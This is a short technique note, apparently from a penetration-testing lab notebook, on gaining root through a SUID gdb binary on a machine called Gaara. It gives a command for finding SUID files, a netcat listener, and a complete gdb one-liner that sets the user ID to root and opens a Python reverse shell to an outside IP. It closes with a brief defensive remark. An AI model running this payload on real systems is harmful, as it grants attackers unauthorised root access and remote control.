# GDB SUID Privilege Escalation

Privilege escalation through a SUID `gdb` binary that can execute embedded Python as root. Used on: **Gaara**.

## Why It Works

When `gdb` has the SUID bit set, its embedded Python interpreter executes with elevated privileges. Attaching to a process and running Python code can set UID to root and spawn a privileged shell or reverse shell.

## Prerequisites

- `/usr/bin/gdb` is SUID root.
- `gdb` has Python support.
- The attacker can receive a reverse shell, or can use an interactive local shell path.

## Discovery

<!-- cmd: linux -->
```bash
find / -perm -4000 -type f 2>/dev/null | xargs ls -la | grep -v snap
which python
```

## Reverse Shell Payload

Start a listener:

<!-- cmd: linux -->
```bash
nc -lvnp 8080
```

Run SUID `gdb` and execute Python:

<!-- cmd: linux -->
```bash
/usr/bin/gdb -nx -p 1 -ex 'python import os; os.setuid(0); import socket,pty;s=socket.socket();s.connect(("192.168.45.169",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' -ex quit
```

- `-nx` skips user config files.
- `-p 1` attaches to PID 1.
- `os.setuid(0)` forces root UID before spawning the shell.

## Defensive Note

Remove SUID from interpreters and debugging tools. `gdb`, Python, Perl, Bash, Vim, and similar binaries should not be SUID root.
